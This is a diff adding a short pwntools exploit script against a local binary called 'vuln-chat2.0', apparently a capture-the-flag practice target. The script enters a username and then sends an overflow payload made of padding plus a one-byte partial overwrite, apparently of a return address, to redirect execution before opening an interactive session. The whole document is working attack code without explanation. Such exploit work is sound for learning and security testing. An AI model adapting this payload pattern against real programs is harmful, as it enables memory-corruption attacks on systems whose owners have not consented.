@@ -1,0 +1,10 @@
+from pwn import *
+
+p = process("./vuln-chat2.0")
+
+p.sendlineafter(b"username: ", b"vani")
+
+payload = b"A" * 0x27 + b"B" * 0x4 + p8(0x72)
+p.sendafter(b"vani", payload)
+
+p.interactive()
